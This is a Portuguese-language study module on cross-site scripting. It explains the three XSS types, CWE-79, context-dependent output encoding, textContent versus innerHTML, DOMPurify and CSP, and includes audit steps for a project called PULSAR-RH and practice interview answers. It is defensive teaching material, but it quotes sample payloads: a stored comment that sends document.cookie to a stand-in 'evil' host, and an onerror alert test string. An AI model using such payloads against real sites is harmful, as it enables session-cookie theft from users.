# 02 — XSS: Stored, Reflected e DOM-Based

> **Formato expandido (v2.1):** este módulo tem §Base (o fundamento com lastro científico),
> §Estruturação (como o conhecimento se organiza) e §Metodologia (o passo-a-passo replicável)
> — além da prática, P/R e checkpoint. Segue o padrão do módulo `05-raciocinio/00-metodologia-da-ia`.

## O que é

**Cross-Site Scripting (XSS)** é quando JavaScript do atacante executa no browser da vítima **dentro do contexto de origem do seu domínio**. O resultado é roubo de cookie de sessão, keylogger, redirect, defacement, exfiltração de dados. No OWASP 2021 é **A03 (Injection)** — e é por uma razão precisa: XSS é o mesmo defeito do SQL injection, só que a "linguagem" injetada é HTML/JS e o "interpretador" é o parser do browser em vez do banco. Este módulo dá os três tipos, mas o que fica é o *princípio único* que os une.

---

## § BASE — o fundamento

**A fraqueza tem nome e número: CWE-79.** O MITRE cataloga XSS como CWE-79 — *Improper Neutralization of Input During Web Page Generation*. Leia o título com atenção: o defeito não é "aceitar input do usuário"; é **gerar a página sem neutralizar o input** antes de misturá-lo ao markup. XSS não é um problema de *entrada* — é um problema de **saída**.

**A raiz: confusão entre dado e código no parser.** O browser recebe uma sequência de bytes e decide, caractere a caractere, o que é *estrutura* (uma tag `<script>`, um handler `onerror=`) e o que é *conteúdo* (o texto "olá"). Quando você injeta o nome do usuário direto no HTML, você deixa o **dado atravessar a fronteira e virar código** — o `<` que deveria ser o texto "menor que" vira a abertura de uma tag. É exatamente a mesma falha de plano de controle vs. plano de dados do SQLi (módulo 03): o parser não consegue distinguir o que é comando do que é dado quando chegam concatenados na mesma string. A defesa é a mesma ideia: **manter dado e código em planos separados** — no caso do browser, garantindo que o dado seja *inerte* no contexto em que ele cai.

**Encoding é dependente de contexto — este é o insight que separa júnior de pleno.** "Escapar" não é uma operação única; depende de *onde* o dado vai parar. O mesmo `"` é inofensivo no corpo de um `<p>` e catastrófico dentro de um atributo `value="..."`. A OWASP XSS Prevention Cheat Sheet organiza isso em regras por contexto: corpo HTML, atributo HTML, dentro de `<script>`, dentro de URL, dentro de CSS — cada um exige uma função de encoding diferente. Encode para o contexto errado é o mesmo que não encodar. A boa notícia: frameworks modernos (React, Angular, Vue) fazem o encoding contextual do corpo HTML por padrão — `{userInput}` em JSX é escapado automaticamente. O buraco aparece quando você força a barreira: `dangerouslySetInnerHTML`, `innerHTML`, `v-html`.

**A fronteira que o XSS explora é a Same-Origin Policy.** O motivo de XSS ser tão grave é que o script injetado roda *como se fosse seu*: ele tem acesso ao DOM, aos cookies não-`HttpOnly` e ao `localStorage` da sua origem, porque para o browser ele *é* da sua origem. XSS é, na essência, uma quebra da Same-Origin Policy de dentro para fora — o atacante não precisa furar a SOP, ele faz *você* rodar o código dele no lado protegido dela.

**O caso real e a correção do número.** Em 2018, um ataque **Magecart** injetou ~22 linhas de JavaScript malicioso no site e no app da British Airways; o script capturou dados de cartão de ~380 mil clientes no checkout. Mecanicamente é a mesma classe do XSS: **código do atacante executando na origem da vítima**. Sobre a multa — atenção ao número que circula errado: o ICO britânico *anunciou intenção* de multar em £183 milhões em 2019, mas a **penalidade final, de outubro de 2020, foi de £20 milhões** (reduzida por mitigação e pelo contexto econômico). Citar £183M como "a multa" é impreciso — a decisão final é £20M. (Regra da casa: número com origem, e origem verificada.)

---

## § ESTRUTURAÇÃO — como esse conhecimento se organiza

Os três tipos diferem por **onde o payload trafega**, mas convergem numa mitigação só:

```
                    ONDE O PAYLOAD VIVE           PASSA PELO SERVIDOR?   DETECTÁVEL POR WAF?
Reflected XSS       na request (URL/form),         sim (na response)      sim (aparece no HTTP)
                    refletido na response
Stored XSS          persistido no banco,           sim (no INSERT)        parcial (no armazenar)
                    servido a todos
DOM-Based XSS       só no JS do browser;            NÃO — nunca sai       NÃO (não há request/response
                    fonte→sink no client            do browser             com o payload)

        ┌─────────────── causa-raiz comum ───────────────┐
        │   dado não-confiável vira código no parser      │
        │   (fonte não neutralizada → sink perigoso)      │
        └─────────────────────────────────────────────────┘
                    mitigação única: encoding contextual na SAÍDA
                    (textContent / framework) + CSP como 2ª linha
```

**Reflected.** Payload vem na request e volta na response sem persistir: `?q=<script>...</script>` refletido em `<p>Resultados para: ...</p>`. Vetor: phishing (a vítima clica o link). **Foi o bug do PULSAR-RH (2026-05-28)** — parâmetros de URL lidos e inseridos no DOM sem encoding.

**Stored (Persistent).** Payload salvo no banco e servido a *todos* que abrem a página (ex.: um comentário `<img src=x onerror='fetch(evil+document.cookie)'>`). Mais grave: não precisa de phishing, atinge todo mundo, persiste até ser removido. O caso Magecart/British Airways acima é dessa família de gravidade (script servido a todos os visitantes do checkout).

**DOM-Based.** O payload nunca toca o servidor — o fluxo *fonte → sink* acontece inteiro no JS do client: `URLSearchParams` (fonte) → `innerHTML` (sink). Como não há request/response com o payload, **WAF e scanner de servidor não veem** e os logs do servidor ficam limpos. Só análise de código frontend pega.

**O sink venenoso e a alternativa segura:**

```js
element.innerHTML = userInput           // ❌ executa scripts embutidos (SINK perigoso)
element.innerHTML = `<b>${name}</b>`    // ❌ mesmo com HTML "inofensivo"
element.textContent = userInput         // ✅ escapa <, >, & → dado vira texto inerte
// Quando PRECISA renderizar HTML do usuário (editor rico, markdown):
import DOMPurify from 'dompurify'
element.innerHTML = DOMPurify.sanitize(userInput)   // remove tag/atributo perigoso
```

`textContent` converte `<`, `>`, `&` em entidades **antes** de inserir — `<script>` vira texto visível, não código. `innerHTML` interpreta como markup. Esta é a diferença que decide o bug.

**Encoding vs. Sanitização vs. Validação — não são sinônimos:**

| Técnica | O que faz | Quando |
|---|---|---|
| **Output encoding** | `<`→`&lt;`, contextual à saída | Sempre que exibir texto do usuário como texto |
| **Sanitização** (DOMPurify) | remove tags/atributos perigosos, mantém formatação | Quando você PRECISA aceitar HTML do usuário |
| **Validação de input** | rejeita formato inválido na boundary | Defesa complementar — **não** substitui encoding |

Regra de ouro: **encode na saída, não na entrada.** Encodar na entrada corrompe o dado no banco (encode duplo, dado inutilizável para outros consumidores); encodar na saída garante que *qualquer* dado, de qualquer origem, é exibido com segurança no contexto certo.

**CSP como defesa em profundidade.** Content-Security-Policy é um header que diz ao browser quais fontes de script são legítimas — se um XSS passar pelo encoding, o browser **recusa executar** o que não está na allowlist:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

CSP **não substitui** encoding (é a última linha, não a primeira); `script-src` sem `'unsafe-inline'` é o que dá poder real. Em Express, `helmet` configura ~12 headers de uma vez — usar em todo projeto AG.

---

## § METODOLOGIA — o passo-a-passo replicável

**1. MAPEAR fontes e sinks.** Fonte = dado não-confiável (URL, form, API, banco). Sink = onde ele vira DOM (`innerHTML`, `outerHTML`, `document.write`, `dangerouslySetInnerHTML`, `v-html`). XSS é sempre uma fonte alcançando um sink sem neutralização no meio.

**2. IDENTIFICAR o contexto do sink.** Corpo HTML? Atributo? Dentro de `<script>`? URL? O contexto determina qual encoding é o correto — errar o contexto é não encodar.

**3. APLICAR a defesa na SAÍDA.** Texto puro → `textContent` (ou o escaping automático do framework). HTML rico necessário → `DOMPurify.sanitize`. Nunca `innerHTML` com dado de origem externa.

**4. ADICIONAR CSP como 2ª linha.** `helmet.contentSecurityPolicy` sem `'unsafe-inline'`. Se o encoding falhar em um ponto esquecido, o CSP segura.

**5. VERIFICAR com payload de teste.** `<img src=x onerror=alert(1)>` no campo. Se abrir o alert, o sink está aberto; se aparecer o texto literal, está neutralizado.

**Anti-padrões:**
- **Encodar na entrada:** corrompe o banco e não protege sinks futuros. Encode na saída.
- **Blocklist de `<script>`:** filtrar a string "script" é inútil — `<img onerror>`, `<svg onload>`, `javascript:` em `href` e dezenas de vetores contornam. Neutralize por encoding/sanitização, não por blocklist.
- **CSP com `'unsafe-inline'`:** praticamente anula a proteção de XSS do CSP. Se precisou, refatore os scripts inline.
- **Confiar no WAF para DOM-Based:** o WAF nunca vê o payload — ele não sai do browser.

---

## Passo-a-passo aplicado (faça agora, ~30min)

O fix do PULSAR-RH foi registrado na memória `pulsar_rh_revisao_2026_05_28.md`. O exercício é entender e conseguir explicar.

```bash
# 1. Achar o commit de correção do XSS no PULSAR-RH
cd ~/projetos/PULSAR-RH
git log --oneline --all | grep -i "xss\|sanitiz\|encod\|param"
git show <hash-do-commit>

# 2. No diff, identificar: qual param? lido via URLSearchParams?
#    inserido via innerHTML? o fix usou textContent / DOMPurify?

# 3. Caçar outros pontos com o mesmo padrão fonte→sink
grep -rn "innerHTML\|outerHTML\|dangerouslySetInnerHTML" src/ --include="*.ts" --include="*.tsx"
grep -rn "URLSearchParams\|searchParams\|location\.search" src/ --include="*.ts" --include="*.tsx"

# 4. Para cada innerHTML: o conteúdo vem de usuário/URL/API? Se sim, trocar.
```

```markdown
## DECISIONS.md — 2026-06-XX — [security] XSS audit PULSAR-RH
**Contexto:** revisão pós-fix XSS de 2026-05-28 (URL params em innerHTML sem encode).
**Tipo (CWE-79):** DOM-Based — payload estava na URL, nunca passou pelo servidor.
**Fix aplicado:** [o que foi feito no commit — textContent? DOMPurify?]
**Pontos adicionais inspecionados:** [arquivos verificados no grep]
**Proteção adicional:** helmet + CSP sem 'unsafe-inline' em projetos AG com Express.
**Em entrevista (30s):**
> "Tínhamos um DOM-Based XSS no PULSAR-RH: URL params lidos via URLSearchParams e inseridos
> com innerHTML. Fix: textContent + CSP via helmet como defesa em profundidade. Aprendi ali a
> diferença entre encodar na saída e sanitizar na entrada."
```

## Por que cai em entrevista

XSS é a pergunta de segurança mais frequente em frontend e fullstack. O entrevistador quer três coisas: (1) você conhece os 3 tipos? (a maioria só sabe Reflected); (2) sabe a diferença entre sanitização e encoding, e por que encoding é contextual? (3) já corrigiu em código real? — a AG tem o commit do PULSAR-RH, use.

> **P:** "Qual a diferença entre Stored XSS e DOM-Based XSS?"
>
> **R (30s):**
> "Stored XSS persiste no banco e afeta todos os usuários que carregam aquela página — o script injetado fica lá até ser removido. DOM-Based XSS nunca passa pelo servidor: o payload fica na URL ou no fragmento `#hash` e é processado só pelo JavaScript do browser, então não aparece nos logs do servidor. A consequência prática é que WAF não detecta DOM-Based XSS. A mitigação é a mesma para ambos: nunca usar `innerHTML` com dado de origem externa, usar `textContent` para texto puro ou DOMPurify quando precisa aceitar HTML."

> **P:** "Você já corrigiu um XSS? Me conta."
>
> **R (30s):**
> "Sim, no PULSAR-RH em maio de 2026. Era DOM-Based: parâmetros de URL eram lidos com URLSearchParams e inseridos no DOM via innerHTML sem nenhum encoding. Um atacante podia enviar um link com o payload na URL. O fix foi trocar por textContent para os casos simples. Depois adicionamos CSP via helmet como segunda linha de defesa — se encoding falhar em algum ponto, o browser recusa executar script não listado na policy."

> **P:** "Por que se diz que XSS é um problema de saída, não de entrada? E por que 'escapar o input' não basta?"
>
> **R (30s):**
> "Porque a fraqueza — CWE-79 — é gerar a página misturando dado e markup sem neutralizar o dado *no contexto em que ele cai*. E encoding é contextual: o mesmo caractere é inofensivo no corpo de um parágrafo e perigoso dentro de um atributo ou de um bloco `<script>`. Se eu 'escapo o input' na entrada, escapo pra um contexto que ainda não sei qual é, corrompo o dado no banco e não protejo o sink certo. Por isso a regra é encodar na saída, no ponto exato onde o dado vira DOM, e deixar CSP como defesa em profundidade caso eu esqueça um ponto."

## Checkpoint

- [ ] Explico os 3 tipos de XSS e por que DOM-Based escapa do WAF, sem consultar
- [ ] Sei que XSS é CWE-79 e por que é um problema de SAÍDA, não de entrada
- [ ] Explico por que encoding é dependente de contexto (corpo vs. atributo vs. script)
- [ ] Sei a diferença entre `textContent`, `DOMPurify` e validação de input, e quando usar cada
- [ ] Li o commit de fix do XSS no PULSAR-RH e descrevo o que mudou
- [ ] Recitei a resposta de entrevista em voz alta em menos de 30 segundos

## Recursos

- CWE-79 (MITRE) — *Improper Neutralization of Input During Web Page Generation*: a definição canônica de XSS
- OWASP *Cross-Site Scripting Prevention Cheat Sheet* — as regras de output encoding **por contexto** (a parte que a maioria ignora)
- OWASP Top 10 2021 — A03 Injection: onde XSS foi reclassificado em 2021 e os CWEs agregados
- MDN — *Node.textContent* e *Element.innerHTML* (a diferença de comportamento de parsing, por seção)
- DOMPurify (cure53) — o sanitizador de referência para browser e Node
- ICO (Reino Unido) — *Penalty Notice British Airways* (out/2020): a multa final de £20M (não os £183M do aviso inicial de 2019); o caso Magecart 2018
- Módulo-irmão `03-sql-injection` — a mesma confusão dado×código, no plano do banco
